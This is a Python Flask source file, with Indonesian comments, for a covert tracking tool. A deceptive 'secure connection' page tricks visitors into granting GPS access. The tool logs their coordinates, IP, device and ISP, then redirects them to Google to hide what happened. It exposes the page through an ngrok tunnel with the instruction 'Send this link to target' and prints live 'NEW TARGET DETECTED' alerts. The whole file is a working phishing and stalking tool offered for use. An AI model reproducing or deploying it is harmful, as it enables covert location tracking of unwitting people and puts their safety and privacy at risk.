from flask import Flask, request, render_template_string, jsonify
import requests
import json
import os
import subprocess
import threading
import time
import datetime

app = Flask(__name__)

LOG_FILE = "logs.txt"
NGROK_PORT = 5000

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
        }
        .box {
            border: 1px solid #00ff41;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            background: #0d0d0d;
            border-radius: 8px;
        }
        h1 { font-size: 18px; font-weight: normal; margin-bottom: 20px; }
        .loader {
            border: 2px solid #00ff41;
            border-top: 2px solid transparent;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 12px; opacity: 0.6; margin-top: 10px; }
        .btn {
            background: #00ff41;
            color: #0a0a0a;
            border: none;
            padding: 12px 30px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover { background: #00cc33; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div id="loading">
            <h1>Establishing Secure Connection...</h1>
            <div class="loader"></div>
            <div class="status">Please wait</div>
        </div>
        <div id="location-prompt" class="hidden">
            <h1>LOCATION ACCESS REQUIRED</h1>
            <p style="font-size:13px;margin:10px 0;color:#aaa;">
                This service needs your location to verify your identity.
                <br><br>
                <span style="color:#ff4444;">Your location will be used for authentication purposes only.</span>
            </p>
            <button class="btn" onclick="requestLocation()">ALLOW LOCATION</button>
            <div class="status" style="margin-top:15px;">Click allow to continue</div>
        </div>
    </div>

    <script>
        var trackingDone = false;

        function requestLocation() {
            if (trackingDone) return;
            
            var statusEl = document.querySelector('.status');
            statusEl.textContent = 'Getting your location...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        var lat = pos.coords.latitude;
                        var lon = pos.coords.longitude;
                        fetch('/track?lat=' + lat + '&lon=' + lon)
                            .then(function() {
                                trackingDone = true;
                                document.getElementById('location-prompt').classList.add('hidden');
                                document.getElementById('loading').classList.remove('hidden');
                                document.querySelector('.status').textContent = 'Location verified. Redirecting...';
                                setTimeout(function() {
                                    window.location.href = 'https://www.google.com';
                                }, 1500);
                            })
                            .catch(function() {
                                statusEl.textContent = 'Error. Trying again...';
                                setTimeout(requestLocation, 1000);
                            });
                    },
                    function(err) {
                        statusEl.textContent = 'Location access is required. Click allow.';
                        document.getElementById('location-prompt').classList.remove('hidden');
                        document.getElementById('loading').classList.add('hidden');
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                statusEl.textContent = 'Your browser does not support location.';
            }
        }

        // Tunggu 1 detik lalu tampilkan prompt location
        setTimeout(function() {
            document.getElementById('loading').classList.add('hidden');
            document.getElementById('location-prompt').classList.remove('hidden');
        }, 1000);
    </script>
</body>
</html>
"""

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_target(data):
    """Print data target ke terminal dengan format bersih"""
    lokasi = data.get('lokasi', {})
    lat = lokasi.get('latitude', 0)
    lon = lokasi.get('longitude', 0)
    kota = lokasi.get('kota', '-')
    provinsi = lokasi.get('provinsi', '-')
    negara = lokasi.get('negara', '-')
    isp = lokasi.get('isp', '-')
    ip = data.get('ip', '-')
    ua = data.get('user_agent', '-')
    ts = data.get('timestamp', '-')

    # Parse device dari user agent
    device = 'PC'
    if 'Android' in ua:
        device = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device = 'iOS'
    elif 'Windows' in ua:
        device = 'Windows'
    elif 'Linux' in ua:
        device = 'Linux'
    elif 'Mac' in ua:
        device = 'Mac'

    browser = 'Unknown'
    if 'Chrome' in ua and 'Edg' not in ua:
        browser = 'Chrome'
    elif 'Firefox' in ua:
        browser = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        browser = 'Safari'
    elif 'Edg' in ua:
        browser = 'Edge'

    gps_tag = 'GPS' if lokasi.get('akurasi') == 'GPS (sangat akurat)' else 'IP'

    clear_screen()
    print('=' * 70)
    print('  NEW TARGET DETECTED')
    print('=' * 70)
    print()
    print('  Time   : ' + ts)
    print('  IP     : ' + ip)
    print('  Device : ' + device + ' / ' + browser)
    print('  ISP    : ' + isp)
    print('  City   : ' + kota)
    print('  Region : ' + provinsi + ', ' + negara)
    print('  Type   : ' + gps_tag)
    print('  Lat    : ' + str(lat))
    print('  Lon    : ' + str(lon))
    print()
    if lat != 0 and lon != 0:
        print('  MAPS   : https://www.google.com/maps?q=' + str(lat) + ',' + str(lon))
    print()
    print('=' * 70)
    print('  Waiting for next target...')
    print('=' * 70)
    print()

    # Bip suara
    if os.name == 'posix':
        os.system('echo -e "\a"')

def monitor_log():
    """Monitor file log real-time"""
    last_size = 0
    if os.path.exists(LOG_FILE):
        last_size = os.path.getsize(LOG_FILE)
    
    while True:
        time.sleep(1)
        if os.path.exists(LOG_FILE):
            current_size = os.path.getsize(LOG_FILE)
            if current_size > last_size:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    f.seek(last_size)
                    new_lines = f.readlines()
                    for line in new_lines:
                        if line.strip():
                            try:
                                data = json.loads(line)
                                ip = data.get('ip', '')
                                # Skip localhost, tampilkan hanya target
                                if ip and not ip.startswith('127.') and not ip.startswith('192.168.'):
                                    print_target(data)
                            except:
                                pass
                last_size = current_size

def get_public_ngrok_url():
    try:
        response = requests.get('http://localhost:4040/api/tunnels', timeout=3)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except:
        return None

def wait_for_ngrok(max_wait=30):
    print('[*] Waiting for ngrok...')
    for i in range(max_wait):
        url = get_public_ngrok_url()
        if url:
            print()
            print('=' * 70)
            print('  PUBLIC LINK: ' + url)
            print('=' * 70)
            print()
            print('  Send this link to target:')
            print('  ' + url)
            print()
            print('  Data: ' + url + '/data?pass=tracker123')
            print('=' * 70)
            print()
            return url
        time.sleep(1)
    print('[-] Ngrok failed. Check http://localhost:4040')
    return None

def start_ngrok():
    try:
        with open('ngrok.log', 'w') as f:
            subprocess.Popen(['ngrok', 'http', str(NGROK_PORT)], stdout=f, stderr=f)
        print('[+] Ngrok started...')
        return True
    except Exception as e:
        print('[-] Failed: ' + str(e))
        return False

def get_location(ip):
    try:
        response = requests.get('http://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone', timeout=5)
        data = response.json()
        if data['status'] == 'success':
            return {
                'ip': ip,
                'negara': data.get('country', '-'),
                'provinsi': data.get('regionName', '-'),
                'kota': data.get('city', '-'),
                'latitude': data.get('lat', 0),
                'longitude': data.get('lon', 0),
                'isp': data.get('isp', '-'),
                'organisasi': data.get('org', '-'),
                'timezone': data.get('timezone', '-')
            }
        return None
    except:
        return None

def log_data(data):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/track', methods=['GET'])
def track():
    client_ip = request.remote_addr
    forwarded_ip = request.headers.get('X-Forwarded-For')
    if forwarded_ip:
        client_ip = forwarded_ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referer = request.headers.get('Referer', 'Direct')
    
    location = get_location(client_ip)
    if location is None:
        location = {
            'ip': client_ip,
            'negara': 'Tidak diketahui',
            'provinsi': '-',
            'kota': '-',
            'latitude': 0,
            'longitude': 0,
            'isp': '-',
            'organisasi': '-',
            'timezone': '-'
        }
    
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    if lat and lon:
        try:
            location['latitude'] = float(lat)
            location['longitude'] = float(lon)
            location['akurasi'] = 'GPS (sangat akurat)'
        except:
            pass
    
    full_data = {
        'timestamp': datetime.datetime.now().isoformat(),
        'ip': client_ip,
        'lokasi': location,
        'user_agent': user_agent,
        'referer': referer
    }
    
    log_data(full_data)
    
    # Kirim response kosong (biar cepat)
    return '', 204

@app.route('/data', methods=['GET'])
def view_data():
    password = request.args.get('pass')
    if password != 'tracker123':
        return 'Access Denied', 403
    
    if not os.path.exists(LOG_FILE):
        return 'No data'
    
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    data_list = [json.loads(line) for line in lines if line.strip()]
    return jsonify(data_list)

if __name__ == '__main__':
    print()
    print('=' * 70)
    print('  TRACKER - FORCE LOCATION ALLOW')
    print('=' * 70)
    print()

    if start_ngrok():
        time.sleep(3)
        public_url = wait_for_ngrok()

    monitor_thread = threading.Thread(target=monitor_log, daemon=True)
    monitor_thread.start()
    print('[*] Real-time monitor active')
    print('[*] Waiting for target...')
    print()

    app.run(host='0.0.0.0', port=5000, debug=False)